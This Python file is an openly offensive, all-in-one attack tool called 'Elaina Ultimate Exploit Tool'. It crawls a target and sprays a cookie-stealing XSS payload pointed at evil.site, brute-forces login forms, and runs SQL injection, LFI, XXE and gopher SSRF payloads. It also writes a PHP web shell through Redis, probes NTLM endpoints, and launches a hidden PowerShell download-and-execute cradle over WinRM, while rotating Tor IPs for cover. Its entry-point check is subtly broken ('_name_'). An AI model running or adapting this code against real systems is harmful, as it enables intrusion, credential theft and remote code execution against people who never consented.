import os
import sys
import time
import json
import random
import warnings
import argparse
import urllib.parse
import socket
import ipaddress
import subprocess

import requests
import cloudscraper
from bs4 import BeautifulSoup
from colorama import init

import undetected_chromedriver as uc
from seleniumwire import webdriver as wire_webdriver
from selenium.webdriver.common.by import By

from stem.control import Controller

from impacket.examples.ntlmrelayx import ntlmrelayx
from impacket.examples.ntlmrelayx.utils.targetsutils import TargetOptions
from impacket import ntlm
from impacket.ntlm import NTLMAuthNegotiate, NTLMAuthChallenge, NTLMAuthAuthenticate
from impacket.dcerpc.v5 import transport, epm
from impacket.dcerpc.v5.rpcrt import DCERPCException

init(autoreset=True)
warnings.filterwarnings("ignore", message="Unverified HTTPS request")

LOG_JSON_PATH = "elaina_ultimate_log.json"
COOKIE_PATH = "elaina_ultimate_cookies.txt"
attacker_ip = "1.2.3.4"

log_entries = []

def log(action, target, status, detail=None):
    entry = {
        "action": action,
        "target": target,
        "status": status,
        "detail": detail or "",
        "time": time.strftime("%Y-%m-%d %H:%M:%S")
    }
    log_entries.append(entry)
    with open(LOG_JSON_PATH, "w") as f:
        json.dump(log_entries, f, indent=2)

def renew_tor_ip(password="yuriontop"):
    try:
        with Controller.from_port(port=9051) as controller:
            controller.authenticate(password=password)
            controller.signal("NEWNYM")
            log("tor", "localhost", "success")
    except Exception as e:
        log("tor", "localhost", "failed", str(e))

def load_proxy_config():
    if os.path.exists("proxy.json"):
        with open("proxy.json") as f:
            return json.load(f)
    return {}

def setup_scraper(proxy_cfg=None):
    session = cloudscraper.create_scraper(
        browser={"custom": "ScraperBot-Yuri08"},
        delay=10,
        interpreter="nodejs"
    )
    session.headers.update({
        "User-Agent": random.choice([
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
            "Mozilla/5.0 (X11; Linux x86_64)",
            "curl/8.0",
            "Wget/1.21",
        ])
    })
    if proxy_cfg:
        session.proxies.update(proxy_cfg)
    return session

def setup_browser(proxy_cfg=None):
    options = uc.ChromeOptions()
    options.add_argument("--headless")
    options.add_argument("--disable-gpu")
    options.add_argument("--no-sandbox")
    options.add_argument("--disable-dev-shm-usage")
    options.add_argument("--window-size=1920,1080")

    wire_opts = {'verify_ssl': False}
    if proxy_cfg and ("http" in proxy_cfg or "https" in proxy_cfg):
        proxy_url = proxy_cfg.get("http") or proxy_cfg.get("https")
        wire_opts['proxy'] = {
            'http': proxy_url,
            'https': proxy_url,
            'no_proxy': 'localhost,127.0.0.1'
        }
        options.add_argument(f"--proxy-server={proxy_url}")

    driver = wire_webdriver.Chrome(options=options, seleniumwire_options=wire_opts)
    return driver

def dump_browser_storage(driver, url):
    driver.get(url)
    time.sleep(4)
    local_storage = driver.execute_script("return {...localStorage};")
    session_storage = driver.execute_script("return {...sessionStorage};")
    cookies = driver.get_cookies()
    log("storage_dump", url, "success", {
        "localStorage_keys": list(local_storage.keys()),
        "sessionStorage_keys": list(session_storage.keys()),
        "cookies_count": len(cookies)
    })
    with open(COOKIE_PATH, "a") as f:
        for c in cookies:
            f.write(f"{url} => {c}\n")
    return {"localStorage": local_storage, "sessionStorage": session_storage, "cookies": cookies}

def extract_js_endpoints(driver):
    scripts = driver.find_elements(By.TAG_NAME, "script")
    js_urls = [s.get_attribute("src") for s in scripts if s.get_attribute("src")]
    network_js = [req.url for req in driver.requests if req.response and ("javascript" in req.response.headers.get("Content-Type", "").lower() or req.path.endswith(".js"))]
    js_all = list(set(js_urls + network_js))
    log("js_endpoints", driver.current_url, "success", {"count": len(js_all)})
    return js_all

def dump_websocket_endpoints(driver):
    ws_endpoints = [req.url for req in driver.requests if req.url.startswith(("ws://", "wss://"))]
    log("websocket_endpoints", driver.current_url, "success", {"count": len(ws_endpoints)})
    return list(set(ws_endpoints))

def send_to_burp(req):
    burp_api = "http://127.0.0.1:1337/v1/repeater"
    try:
        headers = {k: v for k, v in req.headers.items()}
        payload = {
            "request": {
                "method": req.method,
                "url": req.url,
                "headers": headers,
                "body": req.body.decode() if req.body else "",
            }
        }
        r = requests.post(burp_api, json=payload)
        log("burp_repeater", req.url, "success" if r.status_code == 200 else "failed", f"Status {r.status_code}")
    except Exception as e:
        log("burp_repeater", req.url, "error", str(e))

def xss_payload():
    return "<script>fetch('https://evil.site/log?c='+document.cookie)</script>"

def sql_injection_payloads():
    return [
        "' OR '1'='1' -- ",
        "' OR 1=1--",
        "' UNION SELECT NULL--",
        "'; WAITFOR DELAY '0:0:5'--"
    ]

def lfi_payloads():
    return [
        "../../../../../../etc/passwd",
        "../../../../../../windows/win.ini",
        "../../../../../../proc/self/environ"
    ]

def xxe_payload():
    return """<?xml version="1.0"?>
<!DOCTYPE root [
<!ENTITY % remote SYSTEM "http://evil.site/evil.dtd">
%remote;
]>
<root></root>"""

def redis_rce_payload():
    return (
        "*3\r\n$3\r\nSET\r\n$9\r\nwebshell.php\r\n$36\r\n<?php system($_GET['cmd']); ?>\r\n"
        "*3\r\n$4\r\nCONFIG\r\n$7\r\nSETDIR\r\n$1\r\n/tmp\r\n"
        "*3\r\n$6\r\nCONFIG\r\n$8\r\nSETDBFILE\r\n$12\r\nwebshell.php\r\n"
        "*2\r\n$4\r\nSAVE\r\n$0\r\n\r\n"
    )

def gopher_ssrf_payload(ldap_ip):
    gopher_data = "03000102063a8001020101630b04070006082b864886f7120102020500"
    return f"gopher://{ldap_ip}:389/{gopher_data}"

def spider(url, session, depth=3, seen=None):
    if seen is None: seen = set()
    if url in seen or depth == 0: return
    seen.add(url)
    try:
        res = session.get(url, timeout=10, verify=False)
        soup = BeautifulSoup(res.text, "html.parser")
        log("crawl", url, "ok")
    except Exception as e:
        log("crawl", url, "failed", str(e))
        return
    for form in soup.find_all("form"):
        attack_form(form, url, session)
    for a in soup.find_all("a", href=True):
        link = urllib.parse.urljoin(url, a.get("href"))
        if link.startswith("http") and link not in seen:
            try:
                session.post(link, data={"inject": xss_payload()}, verify=False)
                log("payload_drop", link, "sent")
                time.sleep(random.uniform(0.5, 1.5))
            except Exception as e:
                log("payload_drop", link, "error", str(e))
            spider(link, session, depth-1, seen)

def attack_form(form, base_url, session):
    target = urllib.parse.urljoin(base_url, form.get("action", ""))
    fields = [i.get("name") for i in form.find_all("input") if i.get("name")]
    user = next((f for f in fields if "user" in f.lower() or "email" in f.lower()), None)
    pwd = next((f for f in fields if "pass" in f.lower()), None)

    if not user or not pwd:
        try:
            session.post(target, data={"xss": xss_payload()}, verify=False)
            log("form_inject", target, "no_auth_fields", {"payload": "xss"})
        except Exception as e:
            log("form_inject", target, "error", str(e))
        return

    creds = [("admin", "admin"), ("root", "toor"), ("test", "1234")]
    for u, p in creds:
        try:
            res = session.post(target, data={user: u, pwd: p}, timeout=5, verify=False)
            if "invalid" not in res.text.lower():
                log("form_brute", target, "success", {"user": u, "pass": p})
                session.post(target, data={user: xss_payload(), pwd: xss_payload()}, verify=False)
                return
        except Exception as e:
            log("form_error", target, "exception", str(e))
    log("form_brute", target, "failed")

def attempt_sql_injection(url, session):
    for payload in sql_injection_payloads():
        try:
            params = {"id": payload}
            r = session.get(url, params=params, timeout=5, verify=False)
            if "sql syntax" not in r.text.lower() and r.status_code == 200:
                log("sql_injection", url, "success", {"payload": payload})
                return True
        except Exception:
            continue
    log("sql_injection", url, "failed")
    return False

def attempt_ssrf(url, session, ldap_ip):
    payload = gopher_ssrf_payload(ldap_ip)
    ssrf_points = [
        f"{url}/api/redirect?url={payload}",
        f"{url}/redirect?url={payload}"
    ]
    for target in ssrf_points:
        try:
            r = session.get(target, timeout=5, verify=False)
            if r.status_code == 200:
                log("ssrf", target, "success", {"payload": payload})
                return True
        except Exception:
            continue
    log("ssrf", url, "failed")
    return False

def attempt_lfi(url, session):
    for payload in lfi_payloads():
        try:
            target = f"{url}?file={payload}"
            r = session.get(target, timeout=5, verify=False)
            if "root:x:" in r.text or "[extensions]" in r.text:
                log("lfi", target, "success")
                return True
        except Exception:
            continue
    log("lfi", url, "failed")
    return False

def attempt_xxe(url, session):
    headers = {"Content-Type": "application/xml"}
    try:
        r = session.post(url, data=xxe_payload(), headers=headers, timeout=5, verify=False)
        if "root:x:" in r.text:
            log("xxe", url, "success")
            return True
    except Exception:
        pass
    log("xxe", url, "failed")
    return False

def attempt_idor(url, session):
    test_urls = [f"{url}/user/1", f"{url}/user/2"]
    for turl in test_urls:
        try:
            r = session.get(turl, timeout=5, verify=False)
            if r.status_code == 200 and "user" in r.text.lower():
                log("idor", turl, "success")
                return True
        except Exception:
            continue
    log("idor", url, "failed")
    return False

def attempt_redis_rce(ip):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(3)
        s.connect((ip, 6379))
        s.send(redis_rce_payload().encode())
        s.close()
        log("redis_rce", ip, "success")
        return True
    except Exception as e:
        log("redis_rce", ip, "failed", str(e))
        return False

def scan_ldap_ips(cidr):
    net = ipaddress.ip_network(cidr, strict=False)
    ips = [str(ip) for ip in net.hosts()]
    found = []
    for ip in ips:
        for port in [389, 636]:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(1)
                s.connect((ip, port))
                s.close()
                found.append(ip)
                break
            except:
                continue
    return found

def relay_ntlm_attack(ldap_ip):
    stringbinding = r'ncacn_http:{}[5985]'.format(ldap_ip)
    rpctransport = transport.DCERPCTransportFactory(stringbinding)
    rpctransport.set_connect_timeout(5)
    try:
        dce = rpctransport.get_dce_rpc()
        dce.connect()
        dce.bind(epm.MSRPC_UUID_PORTMAP)
        log("ntlm_relay", ldap_ip, "connected")
        dce.disconnect()
        return True
    except DCERPCException as e:
        log("ntlm_relay", ldap_ip, "failed", str(e))
        return False
    except Exception as e:
        log("ntlm_relay", ldap_ip, "failed", str(e))
        return False

def run_powershell_via_winrm(target_ip, username, password, command):
    try:
        import winrm
    except ImportError:
        log("winrm", target_ip, "failed", "winrm package not installed")
        return False

    try:
        session = winrm.Session(target_ip, auth=(username, password))
        r = session.run_ps(command)
        output = r.std_out.decode(errors='ignore') if r.std_out else ''
        error = r.std_err.decode(errors='ignore') if r.std_err else ''
        log("winrm_powershell", target_ip, "success", {"output": output, "error": error})
        return True
    except Exception as e:
        log("winrm_powershell", target_ip, "failed", str(e))
        return False

def chain_exploit_ssrf_to_adcs(session, target_url, ldap_ip, winrm_user=None, winrm_pass=None):
    payload = gopher_ssrf_payload(ldap_ip)
    ssrf_points = [
        f"{target_url}/api/redirect?url={payload}",
        f"{target_url}/redirect?url={payload}"
    ]
    for url in ssrf_points:
        try:
            r = session.get(url, timeout=10, verify=False)
            if r.status_code == 200:
                log("chain_ssrf", url, "success")
                if relay_ntlm_attack(ldap_ip):
                    log("chain_relay_ntlm", ldap_ip, "success")
                    if winrm_user and winrm_pass:
                        # Chạy payload PowerShell qua WinRM
                        ps_cmd = f"powershell -nop -w hidden -c \"IEX (New-Object Net.WebClient).DownloadString('http://{attacker_ip}/payload.ps1')\""
                        run_powershell_via_winrm(ldap_ip, winrm_user, winrm_pass, ps_cmd)
                    return True
        except Exception as e:
            log("chain_exploit", url, "failed", str(e))
    return False

def execute(target, ldap_subnet=None, use_tor=False, tor_pass="yuriontop", use_burp=False, winrm_user=None, winrm_pass=None):
    open(LOG_JSON_PATH, "w").write("[]")
    open(COOKIE_PATH, "w").write("")

    if use_tor:
        renew_tor_ip(tor_pass)

    proxy_cfg = load_proxy_config()
    session = setup_scraper(proxy_cfg)

    ldap_ip = None
    if ldap_subnet:
        ldap_candidates = scan_ldap_ips(ldap_subnet)
        if ldap_candidates:
            ldap_ip = ldap_candidates[0]
        else:
            ldap_ip = "10.0.0.5"
    else:
        ldap_ip = "10.0.0.5"

    spider(target, session)

    if not chain_exploit_ssrf_to_adcs(session, target, ldap_ip, winrm_user, winrm_pass):
        attempt_sql_injection(target, session)
        attempt_ssrf(target, session, ldap_ip)
        attempt_lfi(target, session)
        attempt_xxe(target, session)
        attempt_idor(target, session)
        attempt_redis_rce(ldap_ip)

    driver = setup_browser(proxy_cfg)
    try:
        storage = dump_browser_storage(driver, target)
        js_endpoints = extract_js_endpoints(driver)
        ws_endpoints = dump_websocket_endpoints(driver)

        if use_burp:
            for req in driver.requests:
                send_to_burp(req)

        full_log = {
            "url": target,
            "storage": storage,
            "js_endpoints": js_endpoints,
            "websocket_endpoints": ws_endpoints,
            "chain_exploit": True
        }
        with open(LOG_JSON_PATH, "a") as f:
            f.write(json.dumps(full_log, indent=2))
    finally:
        driver.quit()

def main():
    parser = argparse.ArgumentParser(description="Elaina Ultimate Exploit Tool ")
    parser.add_argument("url", help="Target URL to scan & attack")
    parser.add_argument("--tor", action="store_true", help="Enable TOR")
    parser.add_argument("--tor-pass", default="yuriontop", help="TOR control password")
    parser.add_argument("--burp", action="store_true", help="Send requests to Burp Repeater API")
    parser.add_argument("--ldap-subnet", help="CIDR subnet for LDAP scan, e.g. 10.0.0.0/24")
    parser.add_argument("--winrm-user", help="Username for WinRM PowerShell execution")
    parser.add_argument("--winrm-pass", help="Password for WinRM PowerShell execution")
    args = parser.parse_args()

    try:
        execute(
            args.url,
            ldap_subnet=args.ldap_subnet,
            use_tor=args.tor,
            tor_pass=args.tor_pass,
            use_burp=args.burp,
            winrm_user=args.winrm_user,
            winrm_pass=args.winrm_pass,
        )
    except KeyboardInterrupt:
        sys.exit(0)

if _name_ == "_main_":
    main()
